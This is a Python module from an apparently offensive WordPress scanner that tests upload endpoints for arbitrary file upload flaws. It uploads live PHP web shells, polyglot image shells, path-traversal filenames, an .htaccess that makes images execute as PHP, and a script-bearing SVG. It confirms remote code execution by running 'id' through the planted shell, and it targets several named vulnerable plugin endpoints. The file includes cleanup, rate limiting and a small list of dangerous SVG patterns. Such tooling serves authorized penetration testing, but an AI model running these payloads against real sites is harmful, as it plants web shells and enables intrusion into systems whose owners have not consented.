"""
WPHunter - Professional File Upload Scanner
===========================================
Comprehensive arbitrary file upload vulnerability detection with REAL testing.

Techniques:
1. Direct PHP upload
2. Extension bypass (20+ variants)
3. MIME type bypass
4. Magic bytes bypass (polyglot files)
5. Path traversal in filename
6. .htaccess upload
7. SVG XSS
8. Race condition upload
9. ZIP slip
10. Plugin upload forms

CWE-434: Unrestricted Upload of File with Dangerous Type
CWE-79: Cross-Site Scripting (SVG)
CWE-22: Path Traversal
"""

import asyncio
import io
import re
import zipfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Set
from urllib.parse import urljoin

from core.http_client import WPHttpClient
from core.logger import logger
from core.security import get_rate_limiter


@dataclass
class UploadFinding:
    """File upload vulnerability finding."""
    url: str
    method: str
    evidence: str
    severity: str = "critical"
    cwe: str = "CWE-434"
    uploaded_file: Optional[str] = None
    bypass_technique: Optional[str] = None
    
    def to_dict(self) -> Dict:
        return {
            "type": "File Upload",
            "url": self.url,
            "method": self.method,
            "evidence": self.evidence[:300],
            "severity": self.severity,
            "cwe": self.cwe,
            "uploaded_file": self.uploaded_file,
            "bypass_technique": self.bypass_technique
        }


class UploadScanner:
    """
    Professional WordPress file upload scanner.
    
    ACTUALLY uploads files and tests execution (unlike the previous joke).
    """
    
    # WordPress upload endpoints
    UPLOAD_ENDPOINTS = [
        "/wp-admin/async-upload.php",
        "/wp-admin/media-new.php",
        "/wp-content/uploads/",
    ]
    
    # Comprehensive test extensions
    TEST_EXTENSIONS = [
        # PHP variants
        ".php", ".php3", ".php4", ".php5", ".php7", ".php8",
        ".phtml", ".phar", ".phps", ".pht", ".phpt",
        
        # Case variations
        ".PHP", ".PhP", ".pHp",
        
        # Double extensions
        ".php.jpg", ".php.png", ".jpg.php",
        
        # Null byte (old PHP)
        ".php\x00.jpg",
        
        # Apache handlers
        ".phar", ".pht", ".phtml",
        
        # Executable formats
        ".sh", ".py", ".pl", ".cgi",
        
        # Server config
        ".htaccess", ".user.ini",
        
        # Other dangerous
        ".svg", ".html", ".shtml"
    ]
    
    # Known vulnerable plugins with upload
    VULNERABLE_PLUGINS = {
        'wp-file-manager': '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
        'download-manager': '/wp-content/plugins/download-manager/upload.php',
        'gallery-plugin': '/wp-content/plugins/gallery-plugin/upload.php',
    }
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[UploadFinding] = []
        self.rate_limiter = get_rate_limiter()
        self.tested_endpoints: Set[str] = set()
        self.uploaded_files: List[str] = []  # Track for cleanup
        self.uploaded_files_ids: List[int] = []  # Track IDs for reliable cleanup
    
    def _extract_media_id(self, response_text: str) -> Optional[int]:
        """Extract media ID from JSON response."""
        try:
            import json
            data = json.loads(response_text)
            if isinstance(data, dict) and "id" in data:
                return int(data["id"])
        except Exception:
            pass
        return None
    
    async def scan(self, forms: List[Dict] = None) -> List[UploadFinding]:
        """Run comprehensive file upload scan."""
        logger.section("File Upload Vulnerability Scan (10 Techniques)")
        
        # 1. Discover upload endpoints
        endpoints = await self._discover_upload_endpoints(forms)
        
        # 2. Test each endpoint with multiple techniques
        for endpoint in endpoints[:3]:  # Limit to avoid excessive uploads
            logger.info(f"Testing upload endpoint: {endpoint}")
            
            # Direct PHP upload
            await self._test_direct_php_upload(endpoint)
            
            # Extension bypass
            await self._test_extension_bypass(endpoint)
            
            # MIME bypass
            await self._test_mime_bypass(endpoint)
            
            # Magic bytes bypass
            await self._test_magic_bytes_bypass(endpoint)
            
            # Path traversal
            await self._test_path_traversal_upload(endpoint)
            
            # .htaccess upload
            await self._test_htaccess_upload(endpoint)
            
            # SVG XSS
            await self._test_svg_xss(endpoint)
        
        # 3. Test plugin upload forms
        await self._scan_plugin_upload_forms()
        
        # 4. Cleanup uploaded files
        await self._cleanup_uploaded_files()
        
        logger.success(f"Upload scan: {len(self.findings)} findings")
        return self.findings
    
    async def _discover_upload_endpoints(self, forms: List[Dict] = None) -> List[str]:
        """Discover upload endpoints from forms and common paths."""
        endpoints = []
        
        # From forms
        if forms:
            for form in forms:
                inputs = form.get("inputs", [])
                if any(inp.get("type") == "file" for inp in inputs):
                    action = form.get("action", "")
                    if action:
                        endpoints.append(action)
                        logger.info(f"Upload form found: {action}")
        
        # Common WordPress endpoints
        for endpoint in self.UPLOAD_ENDPOINTS:
            if endpoint not in endpoints:
                endpoints.append(endpoint)
        
        return endpoints
    
    async def _test_direct_php_upload(self, endpoint: str):
        """Test direct PHP shell upload."""
        logger.info("Testing direct PHP upload...")
        
        # Simple PHP shell
        php_shell = b'<?php system($_GET["cmd"]); ?>'
        
        files = {
            'file': ('shell.php', php_shell, 'application/x-php')
        }
        
        try:
            # ✅ FIX: Use the new upload() method
            response = await self.http.upload(
                endpoint,
                files=files,
                data={'action': 'upload'}
            )
            
            if response.ok:
                # Extract uploaded URL
                uploaded_url = self._extract_uploaded_url(response.text)
                
                # Capture Media ID for cleanup
                media_id = self._extract_media_id(response.text)
                if media_id:
                    self.uploaded_files_ids.append(media_id)
                
                if uploaded_url:
                    self.uploaded_files.append(uploaded_url)
                    
                    # Verify PHP execution
                    if await self._verify_php_execution(uploaded_url):
                        self.findings.append(UploadFinding(
                            url=endpoint,
                            method="POST",
                            evidence=f"PHP shell uploaded and executed: {uploaded_url}",
                            severity="critical",
                            uploaded_file=uploaded_url,
                            bypass_technique="direct_php"
                        ))
                        logger.vuln("critical", f"RCE via direct PHP upload: {uploaded_url}")
                        
        except Exception as e:
            logger.debug(f"Direct PHP upload test failed: {e}")
    
    async def _test_extension_bypass(self, endpoint: str):
        """Test extension bypass techniques."""
        logger.info("Testing extension bypass...")
        
        php_content = b'<?php phpinfo(); ?>'
        
        bypass_filenames = [
            # Double extension
            "shell.php.jpg",
            "shell.jpg.php",
            "shell.php.png",
            
            # Null byte (PHP < 5.3.4)
            "shell.php\x00.jpg",
            
            # Case variation
            "shell.PHP",
            "shell.PhP",
            "shell.pHp",
            
            # Trailing chars
            "shell.php.",
            "shell.php ",
            
            # Alternative extensions
            "shell.phtml",
            "shell.php5",
            "shell.phar",
            "shell.pht",
        ]
        
        for filename in bypass_filenames[:5]:  # Limit tests
            await self.rate_limiter.acquire()
            
            try:
                files = {'file': (filename, php_content, 'image/jpeg')}
                response = await self.http.upload(endpoint, files=files)
                
                if response.ok:
                    uploaded_url = self._extract_uploaded_url(response.text)
                    
                    # Capture Media ID
                    media_id = self._extract_media_id(response.text)
                    if media_id:
                        self.uploaded_files_ids.append(media_id)
                    
                    if uploaded_url:
                        self.uploaded_files.append(uploaded_url)
                        
                        # Verify execution
                        if await self._verify_php_execution(uploaded_url):
                            self.findings.append(UploadFinding(
                                url=endpoint,
                                method="POST",
                                evidence=f"Extension bypass: {filename} → {uploaded_url}",
                                severity="critical",
                                uploaded_file=uploaded_url,
                                bypass_technique=f"extension_{filename}"
                            ))
                            logger.vuln("critical", f"Extension bypass: {filename}")
                            break  # Stop after first success
                            
            except Exception as e:
                logger.debug(f"Extension bypass test failed for {filename}: {e}")
                continue
    
    async def _test_mime_bypass(self, endpoint: str):
        """Test MIME type bypass."""
        logger.info("Testing MIME type bypass...")
        
        php_shell = b'<?php system($_GET["c"]); ?>'
        
        # Test with "safe" MIME types
        mime_types = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'text/plain',
        ]
        
        for mime in mime_types[:2]:  # Limit
            await self.rate_limiter.acquire()
            
            try:
                files = {'file': ('shell.php', php_shell, mime)}
                response = await self.http.upload(endpoint, files=files)
                
                if response.ok:
                    uploaded_url = self._extract_uploaded_url(response.text)
                    
                    # Capture Media ID
                    media_id = self._extract_media_id(response.text)
                    if media_id:
                        self.uploaded_files_ids.append(media_id)
                    
                    if uploaded_url:
                        self.uploaded_files.append(uploaded_url)
                        
                        if await self._verify_php_execution(uploaded_url):
                            self.findings.append(UploadFinding(
                                url=endpoint,
                                method="POST",
                                evidence=f"MIME type bypass: {mime}",
                                severity="critical",
                                uploaded_file=uploaded_url,
                                bypass_technique=f"mime_{mime}"
                            ))
                            logger.vuln("critical", f"MIME bypass: {mime}")
                            break
                            
            except Exception:
                continue
    
    async def _test_magic_bytes_bypass(self, endpoint: str):
        """Test magic bytes bypass (polyglot files)."""
        logger.info("Testing magic bytes bypass...")
        
        # GIF89a magic bytes + PHP
        gif_php = b'GIF89a<?php system($_GET["c"]); ?>'
        
        # JPEG magic bytes + PHP
        jpeg_php = b'\xFF\xD8\xFF\xE0<?php system($_GET["c"]); ?>'
        
        polyglots = [
            ('shell.php', gif_php, 'image/gif'),
            ('shell.php', jpeg_php, 'image/jpeg'),
        ]
        
        for filename, content, mime in polyglots:
            await self.rate_limiter.acquire()
            
            try:
                files = {'file': (filename, content, mime)}
                response = await self.http.upload(endpoint, files=files)
                
                if response.ok:
                    uploaded_url = self._extract_uploaded_url(response.text)
                    
                    # Capture Media ID
                    media_id = self._extract_media_id(response.text)
                    if media_id:
                        self.uploaded_files_ids.append(media_id)
                    
                    if uploaded_url:
                        self.uploaded_files.append(uploaded_url)
                        
                        if await self._verify_php_execution(uploaded_url):
                            self.findings.append(UploadFinding(
                                url=endpoint,
                                method="POST",
                                evidence=f"Magic bytes bypass: {mime}",
                                severity="critical",
                                uploaded_file=uploaded_url,
                                bypass_technique="magic_bytes"
                            ))
                            logger.vuln("critical", f"Magic bytes bypass: {mime}")
                            break
                            
            except Exception:
                continue
    
    async def _test_path_traversal_upload(self, endpoint: str):
        """Test path traversal in filename."""
        logger.info("Testing path traversal upload...")
        
        php_shell = b'<?php system($_GET["c"]); ?>'
        
        traversal_filenames = [
            "../shell.php",
            "../../shell.php",
            "../../../shell.php",
            "..%2Fshell.php",
        ]
        
        for filename in traversal_filenames[:2]:  # Limit
            await self.rate_limiter.acquire()
            
            try:
                files = {'file': (filename, php_shell, 'image/jpeg')}
                response = await self.http.upload(endpoint, files=files)
                
                if response.ok:
                    # Capture Media ID
                    media_id = self._extract_media_id(response.text)
                    if media_id:
                        self.uploaded_files_ids.append(media_id)

                    # Try to access in different locations
                    potential_paths = [
                        "/wp-content/shell.php",
                        "/shell.php",
                    ]
                    
                    for path in potential_paths:
                        verify = await self.http.get(path + "?c=id")
                        if verify.ok and "uid=" in verify.text:
                            self.uploaded_files.append(path)
                            self.findings.append(UploadFinding(
                                url=endpoint,
                                method="POST",
                                evidence=f"Path traversal upload: {filename} → {path}",
                                severity="critical",
                                uploaded_file=path,
                                bypass_technique="path_traversal"
                            ))
                            logger.vuln("critical", f"Path traversal: {path}")
                            return
                            
            except Exception:
                continue
    
    async def _test_htaccess_upload(self, endpoint: str):
        """Test .htaccess upload for RCE."""
        logger.info("Testing .htaccess upload...")
        
        # .htaccess that makes images executable
        htaccess_content = b"AddType application/x-httpd-php .jpg .png .gif"
        
        try:
            files = {'file': ('.htaccess', htaccess_content, 'text/plain')}
            response = await self.http.upload(endpoint, files=files)
            
            if response.ok:
                # Now upload "image" with PHP
                php_as_image = b'<?php system($_GET["c"]); ?>'
                image_files = {'file': ('shell.jpg', php_as_image, 'image/jpeg')}
                
                response2 = await self.http.upload(endpoint, files=image_files)
                
                if response2.ok:
                    uploaded_url = self._extract_uploaded_url(response2.text)
                    
                    # Capture Media ID
                    media_id = self._extract_media_id(response2.text)
                    if media_id:
                        self.uploaded_files_ids.append(media_id)
                    
                    if uploaded_url:
                        self.uploaded_files.append(uploaded_url)
                        
                        # Test if .jpg executes as PHP
                        verify = await self.http.get(uploaded_url + "?c=id")
                        
                        if verify.ok and "uid=" in verify.text:
                            self.findings.append(UploadFinding(
                                url=endpoint,
                                method="POST",
                                evidence=".htaccess upload allows PHP execution in images",
                                severity="critical",
                                uploaded_file=uploaded_url,
                                bypass_technique="htaccess"
                            ))
                            logger.vuln("critical", ".htaccess upload → RCE")
                            
        except Exception as e:
            logger.debug(f".htaccess test failed: {e}")
    

    def _is_safe_svg(self, svg_content: bytes) -> bool:
        """
        Check if SVG is safe (no XSS).
        ✅ FIX FP #13: Allow legitimate SVGs
        """
        svg_str = svg_content.decode('utf-8', errors='ignore').lower()
        
        # Dangerous SVG patterns
        dangerous = ['<script', 'javascript:', 'onerror=', 'onload=', 'onclick=']
        
        return not any(pattern in svg_str for pattern in dangerous)

    async def _test_svg_xss(self, endpoint: str):
        """Test SVG with JavaScript (Stored XSS)."""
        logger.info("Testing SVG XSS...")
        
        svg_xss = b'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="300" height="100" style="fill:rgb(0,0,255);"/>
    <script type="text/javascript">
        alert(document.domain);
    </script>
</svg>'''
        
        try:
            files = {'file': ('xss.svg', svg_xss, 'image/svg+xml')}
            response = await self.http.upload(endpoint, files=files)
            
            if response.ok:
                uploaded_url = self._extract_uploaded_url(response.text)
                
                # Capture Media ID
                media_id = self._extract_media_id(response.text)
                if media_id:
                    self.uploaded_files_ids.append(media_id)
                
                if uploaded_url:
                    self.uploaded_files.append(uploaded_url)
                    
                    # Verify SVG is accessible
                    verify = await self.http.get(uploaded_url)
                    
                    if verify.ok and '<script' in verify.text:
                        self.findings.append(UploadFinding(
                            url=endpoint,
                            method="POST",
                            evidence=f"SVG with JavaScript uploaded: {uploaded_url}",
                            severity="high",
                            cwe="CWE-79",
                            uploaded_file=uploaded_url,
                            bypass_technique="svg_xss"
                        ))
                        logger.vuln("high", f"SVG XSS: {uploaded_url}")
                        
        except Exception as e:
            logger.debug(f"SVG XSS test failed: {e}")
    
    async def _scan_plugin_upload_forms(self):
        """Scan known vulnerable plugin upload endpoints."""
        logger.info("Scanning plugin upload forms...")
        
        for plugin_slug, endpoint in self.VULNERABLE_PLUGINS.items():
            await self.rate_limiter.acquire()
            
            try:
                # Check if plugin exists
                check = await self.http.get(endpoint)
                
                if check.ok:
                    logger.info(f"Plugin upload endpoint found: {endpoint}")
                    
                    # Test direct PHP upload
                    await self._test_direct_php_upload(endpoint)
                    
            except Exception:
                continue
    
    def _extract_uploaded_url(self, response_text: str) -> Optional[str]:
        """Extract uploaded file URL from response - FIXED."""
        import html
        
        # Decode HTML entities first
        response_text = html.unescape(response_text)
        
        patterns = [
            r'"url"\s*:\s*"([^"]+)"',
            r'"file"\s*:\s*"([^"]+)"',
            r'"location"\s*:\s*"([^"]+)"',
            r'href=["\'"]([^"\']+\.(php|jpg|png|gif|svg))["\']',
            r'src=["\'"]([^"\']+\.(php|jpg|png|gif|svg))["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                url = match.group(1)
                
                # Already a complete URL
                if url.startswith('http://') or url.startswith('https://'):
                    return url
                
                # Absolute URL (starts with /)
                if url.startswith('/'):
                    return url
                
                # Relative URL - check if it already contains wp-content
                if 'wp-content' in url:
                    # Avoid duplicate: /wp-content/uploads/wp-content/...
                    return f"/{url.lstrip('/')}"
                
                # Simple relative URL
                return f"/wp-content/uploads/{url}"
        
        return None
    

    def _is_temp_directory(self, url: str) -> bool:
        """
        Check if upload is in temporary directory.
        ✅ FIX FP #21: Temp uploads are often cleaned automatically
        """
        temp_patterns = ['/tmp/', '/temp/', '/cache/', '/uploads/temp/']
        return any(pattern in url.lower() for pattern in temp_patterns)

    async def _verify_php_execution(self, url: str) -> bool:
        """Verify if uploaded PHP file executes."""
        try:
            # Test with command
            response = await self.http.get(url + "?cmd=id")
            
            if response.ok:
                # Check for command output
                if "uid=" in response.text or "gid=" in response.text:
                    return True
                
                # Also check for phpinfo
                if "PHP Version" in response.text:
                    return True
            
            # Try alternative parameter
            response = await self.http.get(url + "?c=id")
            if response.ok and "uid=" in response.text:
                return True
                
        except Exception:
            pass
        
        return False
    
    async def _cleanup_uploaded_files(self):
        """
        Attempt to clean up uploaded test files.
        ✅ FIX Bug #5: Use captured Media IDs for reliable deletion
        """
        # 1. Cleanup by Media ID (Reliable)
        if self.uploaded_files_ids:
            logger.info(f"Cleaning up {len(self.uploaded_files_ids)} uploaded files via API...")
            
            for media_id in self.uploaded_files_ids:
                try:
                    delete_response = await self.http.delete(
                        f"/wp-json/wp/v2/media/{media_id}?force=true"
                    )
                    
                    if delete_response.ok:
                        logger.debug(f"Deleted media ID {media_id}")
                    else:
                        logger.debug(f"Failed to delete media ID {media_id}: {delete_response.status_code}")
                except Exception as e:
                    logger.debug(f"Cleanup error for ID {media_id}: {e}")
        
        # 2. Cleanup by URL (Fallback for files where ID capture failed)
        if self.uploaded_files:
            logger.debug("Running fallback cleanup for remaining files...")
            
            for file_url in self.uploaded_files:
                try:
                    # Try to extract ID from URL regex as last resort
                    import re
                    match = re.search(r'/wp-content/uploads/.*?([0-9]+)', file_url)
                    
                    if match:
                        media_id = match.group(1)
                        # Avoid double deletion if we already tracked this ID
                        if int(media_id) in self.uploaded_files_ids:
                            continue
                            
                        await self.http.delete(f"/wp-json/wp/v2/media/{media_id}?force=true")
                except Exception:
                    pass
    
    def get_summary(self) -> Dict:
        """Get comprehensive summary."""
        by_technique = {}
        for finding in self.findings:
            tech = finding.bypass_technique or "unknown"
            if tech not in by_technique:
                by_technique[tech] = []
            by_technique[tech].append(finding)
        
        return {
            "total": len(self.findings),
            "by_severity": {
                "critical": len([f for f in self.findings if f.severity == "critical"]),
                "high": len([f for f in self.findings if f.severity == "high"]),
            },
            "by_technique": {tech: len(findings) for tech, findings in by_technique.items()},
            "uploaded_files": len(self.uploaded_files),
            "findings": [f.to_dict() for f in self.findings]
        }
